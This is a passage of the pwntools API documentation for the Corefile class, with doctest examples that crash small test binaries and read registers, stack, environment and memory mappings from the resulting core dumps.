<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="s1">&#39;core&#39;</span><span class="p">):</span> <span class="n">os</span><span class="o">.</span><span class="n">unlink</span><span class="p">(</span><span class="s1">&#39;core&#39;</span><span class="p">)</span>
</pre></div>
</div>
<p>Let&#8217;s build an example binary which should eat <code class="docutils literal"><span class="pre">R0=0xdeadbeef</span></code>
and <code class="docutils literal"><span class="pre">PC=0xcafebabe</span></code>.</p>
<p>If we run the binary and then wait for it to exit, we can get its
core file.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;arm&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r0&#39;</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r1&#39;</span><span class="p">,</span> <span class="mh">0xcafebabe</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;bx r1&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">address</span> <span class="o">=</span> <span class="mh">0x41410000</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">from_assembly</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">vma</span><span class="o">=</span><span class="n">address</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;HELLO&#39;</span><span class="p">:</span> <span class="s1">&#39;WORLD&#39;</span><span class="p">})</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span><span class="o">.</span><span class="n">poll</span><span class="p">(</span><span class="n">block</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="go">-11</span>
</pre></div>
</div>
<p>You can specify a full path a la <code class="docutils literal"><span class="pre">Corefile('/path/to/core')</span></code>,
but you can also just access the <a class="reference internal" href="index.html#pwnlib.tubes.process.process.corefile" title="pwnlib.tubes.process.process.corefile"><code class="xref py py-attr docutils literal"><span class="pre">process.corefile</span></code></a> attribute.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">core</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">corefile</span>
</pre></div>
</div>
<p>The core file has a <a class="reference internal" href="#pwnlib.elf.corefile.Corefile.exe" title="pwnlib.elf.corefile.Corefile.exe"><code class="xref py py-attr docutils literal"><span class="pre">Corefile.exe</span></code></a> property, which is a <a class="reference internal" href="#pwnlib.elf.corefile.Mapping" title="pwnlib.elf.corefile.Mapping"><code class="xref py py-class docutils literal"><span class="pre">Mapping</span></code></a>
object.  Each mapping can be accessed with virtual addresses via subscript, or
contents can be examined via the <a class="reference internal" href="#pwnlib.elf.corefile.Mapping.data" title="pwnlib.elf.corefile.Mapping.data"><code class="xref py py-attr docutils literal"><span class="pre">Mapping.data</span></code></a> attribute.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">core</span><span class="o">.</span><span class="n">exe</span><span class="o">.</span><span class="n">address</span> <span class="o">==</span> <span class="n">address</span>
<span class="go">True</span>
</pre></div>
</div>
<p>The core file also has registers which can be accessed direclty.
Pseudo-registers <code class="docutils literal"><span class="pre">pc</span></code> and <code class="docutils literal"><span class="pre">sp</span></code> are available on all architectures,
to make writing architecture-agnostic code more simple.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">core</span><span class="o">.</span><span class="n">pc</span> <span class="o">==</span> <span class="mh">0xcafebabe</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">core</span><span class="o">.</span><span class="n">r0</span> <span class="o">==</span> <span class="mh">0xdeadbeef</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">core</span><span class="o">.</span><span class="n">sp</span> <span class="o">==</span> <span class="n">core</span><span class="o">.</span><span class="n">r13</span>
<span class="go">True</span>
</pre></div>
</div>
<p>We may not always know which signal caused the core dump, or what address
caused a segmentation fault.  Instead of accessing registers directly, we
can also extract this information from the core dump.</p>
<p>On QEMU-generated core dumps, this information is unavailable, so we
substitute the value of PC.  In our example, that&#8217;s correct anyway.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">core</span><span class="o">.</span><span class="n">fault_addr</span> <span class="o">==</span> <span class="mh">0xcafebabe</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">core</span><span class="o">.</span><span class="n">signal</span>
<span class="go">11</span>
</pre></div>
</div>
<p>Core files can also be generated from running processes.
This requires GDB to be installed, and can only be done with native
processes.  Getting a &#8220;complete&#8221; corefile requires GDB 7.11 or better.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">(</span><span class="n">binary</span><span class="o">=</span><span class="n">elf</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;HELLO&#39;</span><span class="p">:</span> <span class="s1">&#39;WORLD&#39;</span><span class="p">})</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">core</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">corefile</span>
</pre></div>
</div>
<p>Data can also be extracted directly from the corefile.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">core</span><span class="o">.</span><span class="n">exe</span><span class="p">[</span><span class="n">elf</span><span class="o">.</span><span class="n">address</span><span class="p">:</span><span class="n">elf</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
<span class="go">&#39;\x7fELF&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">core</span><span class="o">.</span><span class="n">exe</span><span class="o">.</span><span class="n">data</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span>
<span class="go">&#39;\x7fELF&#39;</span>
</pre></div>
</div>
<p>Various other mappings are available by name.  On Linux, 32-bit Intel binaries
should have a VDSO section.  Since our ELF is statically linked, there is
no libc which gets mapped.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">core</span><span class="o">.</span><span class="n">vdso</span><span class="o">.</span><span class="n">data</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span>
<span class="go">&#39;\x7fELF&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">core</span><span class="o">.</span><span class="n">libc</span> 
<span class="go">Mapping(&#39;/lib/x86_64-linux-gnu/libc-...&#39;, ...)</span>
</pre></div>
</div>
<p>The corefile also contains a <a class="reference internal" href="#pwnlib.elf.corefile.Corefile.stack" title="pwnlib.elf.corefile.Corefile.stack"><code class="xref py py-attr docutils literal"><span class="pre">Corefile.stack</span></code></a> property, which gives
us direct access to the stack contents.  On Linux, the very top of the stack
should contain two pointer-widths of NULL bytes, preceded by the NULL-
terminated path to the executable (as passed via the first arg to <code class="docutils literal"><span class="pre">execve</span></code>).</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">stack_end</span> <span class="o">=</span> <span class="n">core</span><span class="o">.</span><span class="n">exe</span><span class="o">.</span><span class="n">name</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">stack_end</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">core</span><span class="o">.</span><span class="n">stack</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="n">stack_end</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">len</span><span class="p">(</span><span class="n">core</span><span class="o">.</span><span class="n">stack</span><span class="o">.</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="n">core</span><span class="o">.</span><span class="n">stack</span><span class="o">.</span><span class="n">size</span>
<span class="go">True</span>
</pre></div>
</div>
<p>We can also directly access the environment variables and arguments.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="s1">&#39;HELLO&#39;</span> <span class="ow">in</span> <span class="n">core</span><span class="o">.</span><span class="n">env</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">core</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;HELLO&#39;</span><span class="p">)</span>
<span class="go">&#39;WORLD&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">core</span><span class="o">.</span><span class="n">argc</span>
<span class="go">1</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">core</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="n">core</span><span class="o">.</span><span class="n">stack</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">core</span><span class="o">.</span><span class="n">string</span><span class="p">(</span><span class="n">core</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">==</span> <span class="n">core</span><span class="o">.</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span>
<span class="go">True</span>
</pre></div>
</div>
<p>Corefiles can also be pulled from remote machines via SSH!</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">s</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="s1">&#39;travis&#39;</span><span class="p">,</span> <span class="s1">&#39;example.pwnme&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">_</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">set_working_directory</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">from_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">trap</span><span class="p">())</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">path</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">upload</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">_</span> <span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">chmod</span><span class="p">(</span><span class="s1">&#39;+x&#39;</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
<span class="go">-1</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span><span class="o">.</span><span class="n">corefile</span><span class="o">.</span><span class="n">signal</span> <span class="o">==</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIGTRAP</span> 
<span class="go">True</span>
</pre></div>
</div>
<p>Tests:</p>
<blockquote>
<div><p>These are extra tests not meant to serve as examples.</p>
<p>Corefile.getenv() works correctly, even if the environment variable&#8217;s
value contains embedded &#8216;=&#8217;. Corefile is able to find the stack, even
if the stack pointer doesn&#8217;t point at the stack.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">from_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">crash</span><span class="p">())</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;FOO&#39;</span><span class="p">:</span> <span class="s1">&#39;BAR=BAZ&#39;</span><span class="p">})</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">core</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">corefile</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">core</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;FOO&#39;</span><span class="p">)</span>
<span class="go">&#39;BAR=BAZ&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">core</span><span class="o">.</span><span class="n">sp</span> <span class="o">==</span> <span class="mi">0</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">core</span><span class="o">.</span><span class="n">sp</span> <span class="ow">in</span> <span class="n">core</span><span class="o">.</span><span class="n">stack</span>
<span class="go">False</span>
</pre></div>
</div>
<p>Corefile gracefully handles the stack being filled with garbage, including
argc / argv / envp being overwritten.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="gp">... </span><span class="s1">LOOP:</span>
<span class="gp">... </span><span class="s1">  mov dword ptr [esp], 0x41414141</span>
<span class="gp">... </span><span class="s1">  pop eax</span>
<span class="gp">... </span><span class="s1">  jmp LOOP</span>
<span class="gp">... </span><span class="s1">&#39;&#39;&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">from_assembly</span><span class="p">(</span><span class="n">assembly</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">core</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">corefile</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">core</span><span class="o">.</span><span class="n">argc</span><span class="p">,</span> <span class="n">core</span><span class="o">.</span><span class="n">argv</span><span class="p">,</span> <span class="n">core</span><span class="o">.</span><span class="n">env</span>
<span class="go">(0, [], {})</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">core</span><span class="o">.</span><span class="n">stack</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s1">&#39;AAAA&#39;</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">core</span><span class="o">.</span><span class="n">fault_addr</span> <span class="o">==</span> <span class="n">core</span><span class="o">.</span><span class="n">sp</span>
<span class="go">True</span>
</pre></div>
</div>
</div></blockquote>
<dl class="method">
<dt id="pwnlib.elf.corefile.Corefile.debug">
<code class="descname">debug</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py#L1037-1043"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Corefile.debug" title="Permalink to this definition">¶</a></dt>
<dd><p>Open the corefile under a debugger.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.corefile.Corefile.getenv">
<code class="descname">getenv</code><span class="sig-paren">(</span><em>name</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py#L985-1007"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Corefile.getenv" title="Permalink to this definition">¶</a></dt>
<dd><p>Read an environment variable off the stack, and return its contents.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>name</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Name of the environment variable to read.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">str</span></code></a> &#8211; The contents of the environment variable.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">from_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">trap</span><span class="p">())</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;GREETING&#39;</span><span class="p">:</span> <span class="s1">&#39;Hello!&#39;</span><span class="p">})</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span><span class="o">.</span><span class="n">corefile</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;GREETING&#39;</span><span class="p">)</span>
<span class="go">&#39;Hello!&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Corefile.argc">
<code class="descname">argc</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Corefile.argc" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">int</span></code></a> &#8211; Number of arguments passed</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Corefile.argv">
<code class="descname">argv</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Corefile.argv" title="Permalink to this definition">¶</a></dt>
<dd><p><code class="xref py py-class docutils literal"><span class="pre">list</span></code> &#8211; List of addresses of arguments on the stack.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Corefile.env">
<code class="descname">env</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Corefile.env" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">dict</span></code></a> &#8211; Environment variables read from the stack.  Keys are
the environment variable name, values are the memory address of the
variable.</p>
<p>Note: Use with the <a class="reference internal" href="index.html#pwnlib.elf.elf.ELF.string" title="pwnlib.elf.elf.ELF.string"><code class="xref py py-meth docutils literal"><span class="pre">ELF.string()</span></code></a> method to extract them.</p>
<dl class="docutils">
<dt>Note: If FOO=BAR is in the environment, self.env[&#8216;FOO&#8217;] is the</dt>
<dd>address of the string &#8220;BARx00&#8221;.</dd>
</dl>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Corefile.exe">
<code class="descname">exe</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Corefile.exe" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference internal" href="#pwnlib.elf.corefile.Mapping" title="pwnlib.elf.corefile.Mapping"><code class="xref py py-class docutils literal"><span class="pre">Mapping</span></code></a> &#8211; First mapping for the executable file.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Corefile.fault_addr">
<code class="descname">fault_addr</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Corefile.fault_addr" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">int</span></code></a> &#8211;</p>
<dl class="docutils">
<dt>Address which generated the fault, for the signals</dt>
<dd>SIGILL, SIGFPE, SIGSEGV, SIGBUS.  This is only available in native
core dumps created by the kernel.  If the information is unavailable,
this returns the address of the instruction pointer.</dd>
</dl>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">from_assembly</span><span class="p">(</span><span class="s1">&#39;mov eax, 0xdeadbeef; jmp eax&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span><span class="o">.</span><span class="n">corefile</span><span class="o">.</span><span class="n">fault_addr</span> <span class="o">==</span> <span class="n">io</span><span class="o">.</span><span class="n">corefile</span><span class="o">.</span><span class="n">eax</span> <span class="o">==</span> <span class="mh">0xdeadbeef</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Corefile.libc">
<code class="descname">libc</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Corefile.libc" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference internal" href="#pwnlib.elf.corefile.Mapping" title="pwnlib.elf.corefile.Mapping"><code class="xref py py-class docutils literal"><span class="pre">Mapping</span></code></a> &#8211; First mapping for <code class="docutils literal"><span class="pre">libc.so</span></code></p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Corefile.mappings">
<code class="descname">mappings</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Corefile.mappings" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">dict</span></code></a> &#8211; Dictionary of memory mappings from <code class="docutils literal"><span class="pre">address</span></code> to <code class="docutils literal"><span class="pre">name</span></code></p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Corefile.maps">
<code class="descname">maps</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Corefile.maps" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">str</span></code></a> &#8211; A printable string which is similar to /proc/xx/maps.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">Corefile</span><span class="p">(</span><span class="s1">&#39;./core&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">maps</span>
<span class="go">8048000-8049000 r-xp 1000 /home/user/pwntools/crash</span>
<span class="go">8049000-804a000 r--p 1000 /home/user/pwntools/crash</span>
<span class="go">804a000-804b000 rw-p 1000 /home/user/pwntools/crash</span>
<span class="go">f7528000-f7529000 rw-p 1000 None</span>
<span class="go">f7529000-f76d1000 r-xp 1a8000 /lib/i386-linux-gnu/libc-2.19.so</span>
<span class="go">f76d1000-f76d2000 ---p 1000 /lib/i386-linux-gnu/libc-2.19.so</span>
<span class="go">f76d2000-f76d4000 r--p 2000 /lib/i386-linux-gnu/libc-2.19.so</span>
<span class="go">f76d4000-f76d5000 rw-p 1000 /lib/i386-linux-gnu/libc-2.19.so</span>
<span class="go">f76d5000-f76d8000 rw-p 3000 None</span>
<span class="go">f76ef000-f76f1000 rw-p 2000 None</span>
<span class="go">f76f1000-f76f2000 r-xp 1000 [vdso]</span>
<span class="go">f76f2000-f7712000 r-xp 20000 /lib/i386-linux-gnu/ld-2.19.so</span>
<span class="go">f7712000-f7713000 r--p 1000 /lib/i386-linux-gnu/ld-2.19.so</span>
<span class="go">f7713000-f7714000 rw-p 1000 /lib/i386-linux-gnu/ld-2.19.so</span>
<span class="go">fff3e000-fff61000 rw-p 23000 [stack]</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Corefile.pc">
<code class="descname">pc</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Corefile.pc" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">int</span></code></a> &#8211; The program counter for the Corefile</p>
<p>This is a cross-platform way to get e.g. <code class="docutils literal"><span class="pre">core.eip</span></code>, <code class="docutils literal"><span class="pre">core.rip</span></code>, etc.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Corefile.pid">
<code class="descname">pid</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Corefile.pid" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">int</span></code></a> &#8211; PID of the process which created the core dump.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Corefile.ppid">
<code class="descname">ppid</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Corefile.ppid" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">int</span></code></a> &#8211; Parent PID of the process which created the core dump.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Corefile.prpsinfo">
<code class="descname">prpsinfo</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/corefile.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.corefile.Corefile.prpsinfo" title="Permalink to this definition">¶</a></dt>
<dd><p>The NT_PRPSINFO object</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.corefile.Corefile.prstatus">
